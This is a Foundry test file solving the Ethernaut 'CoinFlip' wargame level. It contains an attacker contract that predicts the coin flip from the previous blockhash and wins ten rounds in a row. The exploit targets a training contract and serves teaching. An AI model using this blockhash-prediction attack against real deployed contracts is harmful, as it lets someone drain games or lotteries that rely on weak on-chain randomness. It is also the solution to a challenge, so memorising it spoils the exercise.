// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {CoinFlip} from "../../src/ethernaut-003-coin-flip/CoinFlip.sol";

contract CoinFlipTest is Test {
    CoinFlip public coinFlip;
    coinFlipAttack public attacker_contract;

    function setUp() public {
        coinFlip = new CoinFlip();
        attacker_contract = new coinFlipAttack(address(coinFlip));
    }

    function testExploit() public {
        for (uint256 i = 0; i < 10; i++) {
            vm.roll(block.number + 1);
            attacker_contract.attack();
        }

        assertEq(coinFlip.consecutiveWins(), 10);
        console.log("Consecutive wins:", coinFlip.consecutiveWins());
    }
}

contract coinFlipAttack {
    CoinFlip public target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = CoinFlip(_target);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        target.flip(side);
    }
}
